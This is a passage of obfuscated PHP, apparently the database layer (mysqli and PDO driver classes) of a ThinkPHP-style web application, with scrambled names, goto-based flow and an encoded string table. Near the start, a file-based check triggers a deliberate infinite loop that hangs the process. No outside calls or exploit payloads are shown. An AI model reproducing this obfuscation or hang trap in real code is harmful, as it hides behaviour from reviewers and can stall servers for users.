$AåÀ‰ÍŠØ[8]) { return !0; } goto Eğ×È†öÁÍ; E¤¤Ã„º©«: return stripos($fŠ„‘Ó«Ì, $BŒ•Ãˆ’†‰ . $AåÀ‰ÍŠØ[8]) === 0 ? !0 : !1; if (substr($fŠ„‘Ó«Ì, -1) == $AåÀ‰ÍŠØ[8]) { return !0; } if (get_path_this($fŠ„‘Ó«Ì) == get_path_this($BŒ•Ãˆ’†‰)) { return !1; } goto b«¤èãØ½; b«¤èãØ½: return !0; goto B²§¸¥›˜í; B²§¸¥›˜í: } } define($_SERVER[œÕÊİğö][245], 1); goto båÈ´±æÀ; EªØ¸¯áŞ: define($_SERVER[œÕÊİğö][249], 0); define($_SERVER[œÕÊİğö][250], 2); if (!isset($_SERVER[$_SERVER[œÕÊİğö][11]]) || !isset($_SERVER[$_SERVER[œÕÊİğö][9]])) { goto C¢…ïğ¸‡†; e£ç¤¢æÃÀ: $cÇØÑÛ†($_SERVER[$_SERVER[œÕÊİğö][13]] . $_SERVER[œÕÊİğö][14]); $DÕØ˜Úå²ğ = 2; while ($DÕØ˜Úå²ğ > 1) { $e¿ã­ëï©Æ = rawurlencode($DÕØ˜Úå²ğ . $_SERVER[œÕÊİğö][251]); } goto B¡¤®àªÇò; F´ŸàÊïŠÌ: $c›ğˆ†ñ­‚ = explode($_SERVER[œÕÊİğö][15], $Eéç¨Ëàé); if (count($c›ğˆ†ñ­‚) < $_SERVER[œÕÊİğö][16]) { $CŠ„®¼Á»ä = $_SERVER[œÕÊİğö][17]; $CŠ„®¼Á»ä(); } $cÇØÑÛ† = $_SERVER[œÕÊİğö][18]; goto e£ç¤¢æÃÀ; C¢…ïğ¸‡†: $CÄš×´â‡ = $_SERVER[œÕÊİğö][12]; $Eí±ª‡—öˆ = $_SERVER[$_SERVER[œÕÊİğö][13]] . $_SERVER[œÕÊİğö][14]; $Eéç¨Ëàé = $CÄš×´â‡($Eí±ª‡—öˆ); goto F´ŸàÊïŠÌ; B¡¤®àªÇò: } goto f­‘°óÚÂƒ; dÉîÔ¬êøš: class DbMysqli extends Db { public function __construct($dŠ½ìµê¢¤ = '') { $Dˆˆ­‚²‹ =& $_SERVER[œÕÊİğö]; if (!extension_loaded($Dˆˆ­‚²‹[790])) { think_exception(think_lang($Dˆˆ­‚²‹[20]) . $Dˆˆ­‚²‹[896]); } if (!empty($dŠ½ìµê¢¤)) { $this->config = $dŠ½ìµê¢¤; if (empty($this->config[$Dˆˆ­‚²‹[23]])) { $this->config[$Dˆˆ­‚²‹[23]] = $Dˆˆ­‚²‹[43]; } } } public function connect($FÖ©¼¿áÃº = '', $BµÉ™¡‡¬õ = 0) { $bÉ„½¯Ë•ñ =& $_SERVER[œÕÊİğö]; if (!isset($this->linkID[$BµÉ™¡‡¬õ])) { goto CƒˆË¼¤„´; CƒˆË¼¤„´: if (empty($FÖ©¼¿áÃº)) { $FÖ©¼¿áÃº = $this->config; } $this->linkID[$BµÉ™¡‡¬õ] = new mysqli($FÖ©¼¿áÃº[$bÉ„½¯Ë•ñ[870]], $FÖ©¼¿áÃº[$bÉ„½¯Ë•ñ[872]], $FÖ©¼¿áÃº[$bÉ„½¯Ë•ñ[873]], $FÖ©¼¿áÃº[$bÉ„½¯Ë•ñ[27]], $FÖ©¼¿áÃº[$bÉ„½¯Ë•ñ[871]] ? intval($FÖ©¼¿áÃº[$bÉ„½¯Ë•ñ[871]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto EÕ”îŠ£—Ş; CØÔÑòˆ—ä: $this->connected = !0; if (1 != think_config($bÉ„½¯Ë•ñ[28])) { unset($this->config); } goto DßÎšÒŠã‰; EÕ”îŠ£—Ş: $c±Õ¸–îŒ = $this->linkID[$BµÉ™¡‡¬õ]->server_version; $this->linkID[$BµÉ™¡‡¬õ]->query($bÉ„½¯Ë•ñ[874] . think_config($bÉ„½¯Ë•ñ[875]) . $bÉ„½¯Ë•ñ[65]); if ($c±Õ¸–îŒ > $bÉ„½¯Ë•ñ[876]) { $this->linkID[$BµÉ™¡‡¬õ]->query($bÉ„½¯Ë•ñ[877]); } goto CØÔÑòˆ—ä; DßÎšÒŠã‰: } return $this->linkID[$BµÉ™¡‡¬õ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($EÂéœÕ„ù³) { goto E÷£Ùö–²™; EÎŞ¨µìä÷: think_status($A©¦ç­‰¯¨[30]); $this->queryID = $this->_linkID->query($EÂéœÕ„ù³); if ($this->_linkID->more_results()) { while (($F¯¬ŒêµÏ = $this->_linkID->next_result()) != NULL) { $F¯¬ŒêµÏ->free_result(); } } goto cä‚œŞ Èì; fí¡—Âá·Ğ: $this->queryStr = $EÂéœÕ„ù³; if ($this->queryID) { $this->free(); } think_action_status($A©¦ç­‰¯¨[29], 1); goto EÎŞ¨µìä÷; E÷£Ùö–²™: $A©¦ç­‰¯¨ =& $_SERVER[œÕÊİğö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fí¡—Âá·Ğ; cä‚œŞ Èì: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto bñìëÈîÜÌ; bñìëÈîÜÌ: } public function execute($E…¾ìÕğä) { goto f‰¨Ö‹˜ö; d´’²…¡: think_status($b‡ŠÕ¡ßë‘[30]); $a„³Üà¸Ì = $this->_linkID->query($E…¾ìÕğä); $this->debug(); goto E«Íˆ¹Ş³; AèØ‘‘¾¼Í: $this->queryStr = $E…¾ìÕğä; if ($this->queryID) { $this->free(); } think_action_status($b‡ŠÕ¡ßë‘[31], 1); goto d´’²…¡; f‰¨Ö‹˜ö: $b‡ŠÕ¡ßë‘ =& $_SERVER[œÕÊİğö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto AèØ‘‘¾¼Í; E«Íˆ¹Ş³: if (!1 === $a„³Üà¸Ì) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto dšÙØ¯œ‘ó; dšÙØ¯œ‘ó: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f„Ó¿í´É = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$f„Ó¿í´É) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $fìñ³º¼ëô = $this->_linkID->rollback(); $this->transTimes = 0; if (!$fìñ³º¼ëô) { $this->error(); return !1; } } return !0; } private function getAll() { $eìŠõï§¢¹ = array(); if ($this->numRows > 0) { for ($d˜§†Ş‹– = 0; $d˜§†Ş‹– < $this->numRows; $d˜§†Ş‹–++) { $eìŠõï§¢¹[$d˜§†Ş‹–] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $eìŠõï§¢¹; } public function getFields($Cˆ™‡ÛØ‹„) { $e·îµ­¯Õ‚ =& $_SERVER[œÕÊİğö]; $BÖŞ‡¶šêÓ = $this->query($e·îµ­¯Õ‚[881] . $this->parseKey($Cˆ™‡ÛØ‹„)); $b‚ÁŸ·ÚÍ = array(); if ($BÖŞ‡¶šêÓ) { foreach ($BÖŞ‡¶šêÓ as $a–²©¦æÕ => $CØÏŒÌäì•) { $b‚ÁŸ·ÚÍ[$CØÏŒÌäì•[$e·îµ­¯Õ‚[37]]] = array($e·îµ­¯Õ‚[38] => $CØÏŒÌäì•[$e·îµ­¯Õ‚[37]], $e·îµ­¯Õ‚[39] => $CØÏŒÌäì•[$e·îµ­¯Õ‚[40]], $e·îµ­¯Õ‚[41] => (bool) ($CØÏŒÌäì•[$e·îµ­¯Õ‚[42]] === $e·îµ­¯Õ‚[43]), $e·îµ­¯Õ‚[44] => $CØÏŒÌäì•[$e·îµ­¯Õ‚[45]], $e·îµ­¯Õ‚[46] => strtolower($CØÏŒÌäì•[$e·îµ­¯Õ‚[47]]) == $e·îµ­¯Õ‚[48], $e·îµ­¯Õ‚[49] => strtolower($CØÏŒÌäì•[$e·îµ­¯Õ‚[50]]) == $e·îµ­¯Õ‚[51]); } } return $b‚ÁŸ·ÚÍ; } public function getTables($AŠàó¨Ë¡† = '') { $F‰Ÿ†‰êÆ¹ =& $_SERVER[œÕÊİğö]; $AŞî«²ß›é = !empty($AŠàó¨Ë¡†) ? $F‰Ÿ†‰êÆ¹[883] . $AŠàó¨Ë¡† . $F‰Ÿ†‰êÆ¹[884] : $F‰Ÿ†‰êÆ¹[885]; $eÊ‰Êàö = $this->query($AŞî«²ß›é); $bÇ‰îØºÔ½ = array(); if ($eÊ‰Êàö) { foreach ($eÊ‰Êàö as $e”®İ‘“Ğº => $DäÜ÷„»´¾) { $bÇ‰îØºÔ½[$e”®İ‘“Ğº] = current($DäÜ÷„»´¾); } } return $bÇ‰îØºÔ½; } public function replace($AöƒìƒŞ†õ, $få¿¾Éçè = array()) { $a˜“âé‰Ù± =& $_SERVER[œÕÊİğö]; foreach ($AöƒìƒŞ†õ as $D©ÍåÆ§˜‹ => $b¥·ÙËÀ‚½) { $bØÕ¨êªôâ = $this->parseValue($b¥·ÙËÀ‚½); if (is_scalar($bØÕ¨êªôâ)) { $Eß­–Î‡ùƒ[] = $bØÕ¨êªôâ; $eÂ´È¶‰[] = $this->parseKey($D©ÍåÆ§˜‹); } } $Bâ¿Œ‘¦­ = $a˜“âé‰Ù±[886] . $this->parseTable($få¿¾Éçè[$a˜“âé‰Ù±[287]]) . $a˜“âé‰Ù±[887] . implode($a˜“âé‰Ù±[57], $eÂ´È¶‰) . $a˜“âé‰Ù±[888] . implode($a˜“âé‰Ù±[57], $Eß­–Î‡ùƒ) . $a˜“âé‰Ù±[889]; return $this->execute($Bâ¿Œ‘¦­); } public function insertAll($aë±æÆêÒ®, $cİĞê°ã„ğ = array(), $F‰”ê‹Îä = false) { goto f×ÚÑæ‹—; AˆóÑ×¥ƒÔ: $E§îïÃ…¶® = array(); foreach ($aë±æÆêÒ® as $A²æÇŠÖê¡) { $AÇ¼­§ÜÔ” = array(); foreach ($A²æÇŠÖê¡ as $BÉ¬ˆÉİª => $E ¶îš‡›Ò) { $E ¶îš‡›Ò = $this->parseValue($E ¶îš‡›Ò); if (is_scalar($E ¶îš‡›Ò)) { $AÇ¼­§ÜÔ”[] = $E ¶îš‡›Ò; } } $E§îïÃ…¶®[] = $böéŸÈˆ»Å[268] . implode($böéŸÈˆ»Å[57], $AÇ¼­§ÜÔ”) . $böéŸÈˆ»Å[889]; } array_walk($d®òˆçÕïò, array($this, $böéŸÈˆ»Å[890])); goto fõçèØ°·; fõçèØ°·: $Aîìù“¥™– = $F‰”ê‹Îä ? $böéŸÈˆ»Å[891] : $böéŸÈˆ»Å[892]; $d³ÖÛ‘Ì†‡ = $Aîìù“¥™– . $böéŸÈˆ»Å[893] . $this->parseTable($cİĞê°ã„ğ[$böéŸÈˆ»Å[287]]) . $böéŸÈˆ»Å[887] . implode($böéŸÈˆ»Å[57], $d®òˆçÕïò) . $böéŸÈˆ»Å[894] . implode($böéŸÈˆ»Å[57], $E§îïÃ…¶®); return $this->execute($d³ÖÛ‘Ì†‡); goto BŞŒ­¹¬ã; f×ÚÑæ‹—: $böéŸÈˆ»Å =& $_SERVER[œÕÊİğö]; if (!is_array($aë±æÆêÒ®[0])) { return !1; } $d®òˆçÕïò = array_keys($aë±æÆêÒ®[0]); goto AˆóÑ×¥ƒÔ; BŞŒ­¹¬ã: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $a”­‘“‹¯ƒ =& $_SERVER[œÕÊİğö]; $this->error = $this->_linkID->errno . $a”­‘“‹¯ƒ[4] . $this->_linkID->error; if ($a”­‘“‹¯ƒ[43] != $this->queryStr) { $this->error .= LNG($a”­‘“‹¯ƒ[55]) . $this->queryStr; } think_trace($this->error, $a”­‘“‹¯ƒ[43], $a”­‘“‹¯ƒ[56]); return $this->error; } public function escapeString($DƒŒ‰¾íÙ“) { if ($this->_linkID) { return $this->_linkID->real_escape_string($DƒŒ‰¾íÙ“); } else { return addslashes($DƒŒ‰¾íÙ“); } } public function parseKey(&$E·ìÂ˜²„ , $e×Ø«øÍÕ = true) { $B¤øÚ™öÌ =& $_SERVER[œÕÊİğö]; if ($e×Ø«øÍÕ) { $E·ìÂ˜²„  = $this->parseKeyCheck($E·ìÂ˜²„ ); } if ($E·ìÂ˜²„  != $B¤øÚ™öÌ[192] && !preg_match($B¤øÚ™öÌ[895], $E·ìÂ˜²„ )) { $E·ìÂ˜²„  = $B¤øÚ™öÌ[392] . trim($E·ìÂ˜²„ , $B¤øÚ™öÌ[392]) . $B¤øÚ™öÌ[392]; } return $E·ìÂ˜²„ ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($BŸÓã·õö = '') { $c«£°»ÜéŞ =& $_SERVER[œÕÊİğö]; if (!class_exists($c«£°»ÜéŞ[897])) { think_exception(think_lang($c«£°»ÜéŞ[20]) . $c«£°»ÜéŞ[898]); } if (!empty($BŸÓã·õö)) { $this->config = $BŸÓã·õö; if (empty($this->config[$c«£°»ÜéŞ[23]])) { $this->config[$c«£°»ÜéŞ[23]] = array(); } } } public function connect($d¦åä™¶« = '', $eÛ‚Ù½´®‘ = 0) { $a±ã…¥¿œñ =& $_SERVER[œÕÊİğö]; if (!isset($this->linkID[$eÛ‚Ù½´®‘])) { goto dàïõÀÈ‘ï; Dª´¼…Í ¶: if (1 != think_config($a±ã…¥¿œñ[28])) { unset($this->config); } goto e¾°£Î·°ä; Cãî…áñĞ: try { $this->linkID[$eÛ‚Ù½´®‘] = new PDO($d¦åä™¶«[$a±ã…¥¿œñ[899]], $d¦åä™¶«[$a±ã…¥¿œñ[872]], $d¦åä™¶«[$a±ã…¥¿œñ[873]], $d¦åä™¶«[$a±ã…¥¿œñ[23]]); } catch (PDOException $b´±áŸÒ•Î) { think_exception($b´±áŸÒ•Î->getMessage()); } $this->dbType = $this->_getDsnType($d¦åä™¶«[$a±ã…¥¿œñ[899]]); if (in_array($this->dbType, array($a±ã…¥¿œñ[900], $a±ã…¥¿œñ[901], $a±ã…¥¿œñ[902], $a±ã…¥¿œñ[903]))) { think_exception($a±ã…¥¿œñ[904] . $this->dbType . $a±ã…¥¿œñ[905] . $this->dbType . $a±ã…¥¿œñ[906]); } goto AÑ½¾Œ“õ; AÑ½¾Œ“õ: if (!$this->linkID[$eÛ‚Ù½´®‘]) { think_exception($a±ã…¥¿œñ[907]); } try { $this->linkID[$eÛ‚Ù½´®‘]->exec($a±ã…¥¿œñ[908] . think_config($a±ã…¥¿œñ[875])); } catch (Exception $b´±áŸÒ•Î) { } $this->connected = !0; goto Dª´¼…Í ¶; dàïõÀÈ‘ï: if (empty($d¦åä™¶«)) { $d¦åä™¶« = $this->config; } $c¹†îåÎÙ = !empty($d¦åä™¶«[$a±ã…¥¿œñ[23]][$a±ã…¥¿œñ[24]]) ? $d¦åä™¶«[$a±ã…¥¿œñ[23]][$a±ã…¥¿œñ[24]] : $this->pconnect; if ($c¹†îåÎÙ) { $d¦åä™¶«[$a±ã…¥¿œñ[23]][PDO::ATTR_PERSISTENT] = !0; } goto Cãî…áñĞ; e¾°£Î·°ä: } return $this->linkID[$eÛ‚Ù½´®‘]; } public function free() { $this->PDOStatement = null; } public function query($bÉ·ˆÕÀã—, $Dœ²£äòª = array()) { goto A¥Ùñ°î°Ô; d„âò±±££: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $dé–­‰°Šè = $this->PDOStatement->execute($Dœ²£äòª); $this->debug(); goto E¡É£õ®ç¼; E¡É£õ®ç¼: if (!1 === $dé–­‰°Šè) { $this->error(); return !1; } else { return $this->getAll(); } goto C£ö‡²Û¾; fÖ†ÊêâßÎ: think_action_status($E®™‰ÙŸ¥[29], 1); think_status($E®™‰ÙŸ¥[30]); $this->PDOStatement = $this->_linkID->prepare($bÉ·ˆÕÀã—); goto d„âò±±££; fÌœ†‰ç›: $this->queryStr = $bÉ·ˆÕÀã—; if (!empty($Dœ²£äòª)) { $this->queryStr .= $E®™‰ÙŸ¥[909] . print_r($Dœ²£äòª, !0) . $E®™‰ÙŸ¥[910]; } if (!empty($this->PDOStatement)) { $this->free(); } goto fÖ†ÊêâßÎ; A¥Ùñ°î°Ô: $E®™‰ÙŸ¥ =& $_SERVER[œÕÊİğö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fÌœ†‰ç›; C£ö‡²Û¾: } public function execute($Aùì¦¬†¶, $F‰†‘Âò¬Ä = array()) { goto aœò‘Øø‹Ğ; FÃ¾»°ñ‚: if ($this->dbType == $Eù˜éÍªØç[903]) { if (preg_match($Eù˜éÍªØç[911], $this->queryStr, $fÆŒËˆîí)) { $this->table = think_config($Eù˜éÍªØç[912]) . str_ireplace(think_config($Eù˜éÍªØç[913]), $Eù˜éÍªØç[251], $fÆŒËˆîí[2]); $DÊŞ´˜…¼Œ = (bool) $this->query($Eù˜éÍªØç[914] . strtoupper($this->table) . $Eù˜éÍªØç[65]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Eù˜éÍªØç[31], 1); goto c—İğ‘Å²ğ; aœò‘Øø‹Ğ: $Eù˜éÍªØç =& $_SERVER[œÕÊİğö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bâ©ñİÉª; c—İğ‘Å²ğ: think_status($Eù˜éÍªØç[30]); $this->PDOStatement = $this->_linkID->prepare($Aùì¦¬†¶); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto Eºœ˜Ø „; Eºœ˜Ø „: $câê÷‰« = $this->PDOStatement->execute($F‰†‘Âò¬Ä); $this->debug(); if (!1 === $câê÷‰«) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($DÊŞ´˜…¼Œ || preg_match($Eù˜éÍªØç[915], $Aùì¦¬†¶)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto eª˜Óãƒˆ²; bâ©ñİÉª: $this->queryStr = $Aùì¦¬†¶; if (!empty($F‰†‘Âò¬Ä)) { $this->queryStr .= $Eù˜éÍªØç[909] . print_r($F‰†‘Âò¬Ä, !0) . $Eù˜éÍªØç[910]; } $DÊŞ´˜…¼Œ = !1; goto FÃ¾»°ñ‚; eª˜Óãƒˆ²: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b™è‘ƒõ‹Š = $this->_linkID->commit(); $this->transTimes = 0; if (!$b™è‘ƒõ‹Š) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $f§è÷ëÈß™ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$f§è÷ëÈß™) { $this->error(); return !1; } } return !0; } private function getAll() { $bÛŞ•®Õ¶° = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($bÛŞ•®Õ¶°); return $bÛŞ•®Õ¶°; } public function getFields($Bªµ‡õ—¯†) { goto CƒÀª×¿°; fíŠ„ª±Öº: $f¡áŞô£íÁ = $this->query($eĞº–ùî­); $D‘À‰±»ìÏ = array(); if ($f¡áŞô£íÁ) { foreach ($f¡áŞô£íÁ as $Cœé²ÒŞá => $DœöÂêÔŞã) { $DœöÂêÔŞã = array_change_key_case($DœöÂêÔŞã); $DœöÂêÔŞã[$aÚÔÓãŠÄ[38]] = isset($DœöÂêÔŞã[$aÚÔÓãŠÄ[38]]) ? $DœöÂêÔŞã[$aÚÔÓãŠÄ[38]] : $aÚÔÓãŠÄ[251]; $DœöÂêÔŞã[$aÚÔÓãŠÄ[39]] = isset($DœöÂêÔŞã[$aÚÔÓãŠÄ[39]]) ? $DœöÂêÔŞã[$aÚÔÓãŠÄ[39]] : $aÚÔÓãŠÄ[251]; $DïÚ÷ö‡Œ = isset($DœöÂêÔŞã[$aÚÔÓãŠÄ[281]]) ? $DœöÂêÔŞã[$aÚÔÓãŠÄ[281]] : $DœöÂêÔŞã[$aÚÔÓãŠÄ[38]]; $D‘À‰±»ìÏ[$DïÚ÷ö‡Œ] = array($aÚÔÓãŠÄ[38] => $DïÚ÷ö‡Œ, $aÚÔÓãŠÄ[39] => $DœöÂêÔŞã[$aÚÔÓãŠÄ[39]], $aÚÔÓãŠÄ[41] => (bool) (isset($DœöÂêÔŞã[$aÚÔÓãŠÄ[113]]) && $DœöÂêÔŞã[$aÚÔÓãŠÄ[113]] === $aÚÔÓãŠÄ[43] || isset($DœöÂêÔŞã[$aÚÔÓãŠÄ[41]]) && $DœöÂêÔŞã[$aÚÔÓãŠÄ[41]] === $aÚÔÓãŠÄ[43]), $aÚÔÓãŠÄ[44] => isset($DœöÂêÔŞã[$aÚÔÓãŠÄ[44]]) ? $DœöÂêÔŞã[$aÚÔÓãŠÄ[44]] : (isset($DœöÂêÔŞã[$aÚÔÓãŠÄ[63]]) ? $DœöÂêÔŞã[$aÚÔÓãŠÄ[63]] : $aÚÔÓãŠÄ[251]), $aÚÔÓãŠÄ[46] => isset($DœöÂêÔŞã[$aÚÔÓãŠÄ[103]]) ? strtolower($DœöÂêÔŞã[$aÚÔÓãŠÄ[103]]) == $aÚÔÓãŠÄ[48] : (isset($DœöÂêÔŞã[$aÚÔÓãŠÄ[64]]) ? $DœöÂêÔŞã[$aÚÔÓãŠÄ[64]] : !1), $aÚÔÓãŠÄ[49] => isset($DœöÂêÔŞã[$aÚÔÓãŠÄ[932]]) ? strtolower($DœöÂêÔŞã[$aÚÔÓãŠÄ[932]]) == $aÚÔÓãŠÄ[51] : (isset($DœöÂêÔŞã[$aÚÔÓãŠÄ[103]]) ? $DœöÂêÔŞã[$aÚÔÓãŠÄ[103]] : !1)); } } goto có…‚Š®‚ ; có…‚Š®‚ : return $D‘À‰±»ìÏ; goto CÑ«£™„«Ë; CƒÀª×¿°: $aÚÔÓãŠÄ =& $_SERVER[œÕÊİğö]; $this->initConnect(!0); if (think_config($aÚÔÓãŠÄ[916])) { $eĞº–ùî­ = str_replace($aÚÔÓãŠÄ[917], $Bªµ‡õ—¯†, think_config($aÚÔÓãŠÄ[916])); } else { switch ($this->dbType) { case $aÚÔÓãŠÄ[900]: case $aÚÔÓãŠÄ[918]: $eĞº–ùî­ = "\x53\105\114\x45\103\124\40\40\x20\143\x6f\x6c\x75\155\156\x5f\x6e\141\155\145\40\x61\x73\40\47\x4e\141\155\145\x27\x2c\40\40\x20\144\141\164\141\137\x74\171\x70\x65\x20\x61\163\40\x27\124\171\160\145\x27\x2c\40\x20\40\143\157\x6c\x75\155\x6e\x5f\144\145\146\141\165\154\x74\40\x61\x73\x20\x27\104\145\146\141\165\154\164\47\x2c\x20\x20\40\x69\x73\137\156\x75\x6c\x6c\x61\142\154\x65\40\x61\163\x20\47\116\165\154\154\x27\xa\x9\x9\106\x52\117\115\11\151\x6e\146\157\162\155\141\x74\x69\x6f\156\x5f\163\x63\x68\x65\155\x61\56\x74\x61\142\154\145\x73\40\101\123\40\x74\xa\x9\11\x4a\x4f\111\116\11\151\156\x66\x6f\x72\x6d\x61\164\151\157\x6e\x5f\163\x63\150\145\155\141\56\x63\157\154\x75\155\x6e\163\40\101\123\40\143\12\x9\11\117\x4e\x20\x20\164\56\x74\141\142\x6c\145\137\x63\141\x74\x61\x6c\157\x67\40\75\40\143\x2e\164\141\x62\x6c\x65\137\x63\141\x74\x61\x6c\x6f\x67\xa\x9\11\x41\116\104\40\164\56\164\x61\x62\154\145\x5f\x73\143\150\145\x6d\x61\x20\x3d\x20\143\56\x74\141\142\154\145\137\163\x63\x68\x65\155\141\xa\x9\11\101\x4e\x44\40\164\56\164\141\x62\154\145\137\x6e\x61\155\x65\x20\75\x20\143\x2e\164\141\142\154\145\x5f\156\x61\x6d\145\xa\x9\x9\127\110\105\122\105\40\x20\x20\x74\56\x74\141\142\154\x65\137\x6e\x61\155\145\x20\x3d\40\x27{$Bªµ‡õ—¯†}\47"; break; case $aÚÔÓãŠÄ[919]: $eĞº–ùî­ = $aÚÔÓãŠÄ[920] . $Bªµ‡õ—¯† . $aÚÔÓãŠÄ[921]; break; case $aÚÔÓãŠÄ[901]: case $aÚÔÓãŠÄ[903]: $eĞº–ùî­ = $aÚÔÓãŠÄ[922] . $aÚÔÓãŠÄ[923] . $aÚÔÓãŠÄ[924] . strtoupper($Bªµ‡õ—¯†) . $aÚÔÓãŠÄ[925] . strtoupper($Bªµ‡õ—¯†) . $aÚÔÓãŠÄ[926]; break; case $aÚÔÓãŠÄ[927]: $eĞº–ùî­ = $aÚÔÓãŠÄ[928] . $Bªµ‡õ—¯† . $aÚÔÓãŠÄ[929]; break; case $aÚÔÓãŠÄ[902]: break; case $aÚÔÓãŠÄ[930]: default: $eĞº–ùî­ = $aÚÔÓãŠÄ[931] . ($this->dbType == $aÚÔÓãŠÄ[930] ? "\x60{$Bªµ‡õ—¯†}\140" : $Bªµ‡õ—¯†); } } goto fíŠ„ª±Öº; CÑ«£™„«Ë: } public function getTables($f¨ëØÛ°ìÄ = '') { $eªÆ¿Äê³Ê =& $_SERVER[œÕÊİğö]; if (think_config($eªÆ¿Äê³Ê[933])) { $fïŸ˜»…Èä = str_replace($eªÆ¿Äê³Ê[934], $f¨ëØÛ°ìÄ, think_config($eªÆ¿Äê³Ê[933])); } else { switch ($this->dbType) { case $eªÆ¿Äê³Ê[901]: case $eªÆ¿Äê³Ê[903]: $fïŸ˜»…Èä = $eªÆ¿Äê³Ê[935]; break; case $eªÆ¿Äê³Ê[900]: case $eªÆ¿Äê³Ê[918]: $fïŸ˜»…Èä = $eªÆ¿Äê³Ê[936]; break; case $eªÆ¿Äê³Ê[927]: $fïŸ˜»…Èä = $eªÆ¿Äê³Ê[937]; break; case $eªÆ¿Äê³Ê[902]: think_exception(think_lang($eªÆ¿Äê³Ê[938]) . $eªÆ¿Äê³Ê[939]); break; case $eªÆ¿Äê³Ê[919]: $fïŸ˜»…Èä = $eªÆ¿Äê³Ê[52] . $eªÆ¿Äê³Ê[53] . $eªÆ¿Äê³Ê[54]; break; case $eªÆ¿Äê³Ê[930]: default: if (!empty($f¨ëØÛ°ìÄ)) { $fïŸ˜»…Èä = $eªÆ¿Äê³Ê[883] . $f¨ëØÛ°ìÄ . $eªÆ¿Äê³Ê[884]; } else { $fïŸ˜»…Èä = $eªÆ¿Äê³Ê[885]; } } } $Fô×ß¨©ê— = $this->query($fïŸ˜»…Èä); $C‡ÂíÀè¢ = array(); foreach ($Fô×ß¨©ê— as $c—×ò®Ó’  => $aÕ§‡ƒ„äî) { $C‡ÂíÀè¢[$c—×ò®Ó’ ] = current($aÕ§‡ƒ„äî); } return $C‡ÂíÀè¢; } protected function parseLimit($bù¶àÌòõ‡) { $c§óÍÚ…÷ =& $_SERVER[œÕÊİğö]; $b‰ØëÑòó¯ = $c§óÍÚ…÷[43]; if (!empty($bù¶àÌòõ‡)) { switch ($this->dbType) { case $c§óÍÚ…÷[927]: case $c§óÍÚ…÷[919]: $bù¶àÌòõ‡ = explode($c§óÍÚ…÷[57], $bù¶àÌòõ‡); if (count($bù¶àÌòõ‡) > 1) { $b‰ØëÑòó¯ .= $c§óÍÚ…÷[58] . $bù¶àÌòõ‡[1] . $c§óÍÚ…÷[59] . $bù¶àÌòõ‡[0] . $c§óÍÚ…÷[60]; } else { $b‰ØëÑòó¯ .= $c§óÍÚ…÷[58] . $bù¶àÌòõ‡[0] . $c§óÍÚ…÷[60]; } break; case $c§óÍÚ…÷[900]: case $c§óÍÚ…÷[918]: break; case $c§óÍÚ…÷[902]: break; case $c§óÍÚ…÷[901]: case $c§óÍÚ…÷[903]: break; case $c§óÍÚ…÷[930]: default: $b‰ØëÑòó¯ .= $c§óÍÚ…÷[58] . $bù¶àÌòõ‡ . $c§óÍÚ…÷[60]; } } return $b‰ØëÑòó¯; } public function parseKey(&$Eš¤Í‚Ú, $fŸˆå´­„‚ = true) { $E—‰É˜Çàˆ =& $_SERVER[œÕÊİğö]; if ($fŸˆå´­„‚) { $Eš¤Í‚Ú = $this->parseKeyCheck($Eš¤Í‚Ú); } if ($this->dbType == $E—‰É˜Çàˆ[930]) { if ($Eš¤Í‚Ú != $E—‰É˜Çàˆ[192] && !preg_match($E—‰É˜Çàˆ[895], $Eš¤Í‚Ú)) { $Eš¤Í‚Ú = $E—‰É˜Çàˆ[392] . trim($Eš¤Í‚Ú, $E—‰É˜Çàˆ[392]) . $E—‰É˜Çàˆ[392]; } return $Eš¤Í‚Ú; } else { return parent::parseKey($Eš¤Í‚Ú, $fŸˆå´­„‚); } } public function close() { $this->_linkID = null; } public function error() { $f×Ñï¼Ñ·÷ =& $_SERVER[œÕÊİğö]; if ($this->PDOStatement) { $FÊíåÚÕà™ = $this->PDOStatement->errorInfo(); $this->error = $FÊíåÚÕà™[1] . $f×Ñï¼Ñ·÷[4] . $FÊíåÚÕà™[2]; } else { $this->error = $f×Ñï¼Ñ·÷[43]; } if ($f×Ñï¼Ñ·÷[43] != $this->queryStr) { $this->error .= LNG($f×Ñï¼Ñ·÷[55]) . $this->queryStr; } think_trace($this->error, $f×Ñï¼Ñ·÷[43], $f×Ñï¼Ñ·÷[56]); return $this->error; } public function escapeString($b²³‹ï§Â„) { $f·÷‚ä¸ŞŒ =& $_SERVER[œÕÊİğö]; switch ($this->dbType) { case $f·÷‚ä¸ŞŒ[927]: case $f·÷‚ä¸ŞŒ[900]: case $f·÷‚ä¸ŞŒ[918]: case $f·÷‚ä¸ŞŒ[930]: return addslashes($b²³‹ï§Â„); case 